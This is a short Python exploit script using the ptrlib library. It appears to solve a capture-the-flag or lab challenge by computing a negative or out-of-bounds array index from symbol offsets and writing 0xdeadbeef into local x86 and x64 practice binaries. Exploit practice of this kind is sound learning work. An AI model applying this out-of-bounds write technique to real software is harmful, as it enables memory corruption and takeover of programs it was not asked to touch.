from ptrlib import *
import sys

x86target = 0xdeadbeef
x64target = 0xffffffffdeadbeef

x86cmd = ['./x86.out']
x64cmd = ['./x64.out']

def x86pwn():
    elf = ELF('./x86.out')
    p = Process(x86cmd)
    p.sendline(str((elf.symbol('a') - elf.symbol('f')) // 4))
    p.sendline(str(u32(p32(x86target), signed=True)))
    p.interactive()

def x64pwn():
    elf = ELF('./x64.out')
    p = Process(x64cmd)
    p.sendline(str((elf.symbol('a') - elf.symbol('f')) // 8))
    p.sendline(str(u64(p64(x64target), signed=True)))
    p.interactive()

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print(f"[-] Usage: {sys.argv[0]} [x86|x64]")
    else:
        if sys.argv[1] == 'x86':
            x86pwn()
        elif sys.argv[1] == 'x64':
            x64pwn()
        else:
            print("[-] Set 'x86' or 'x64'")
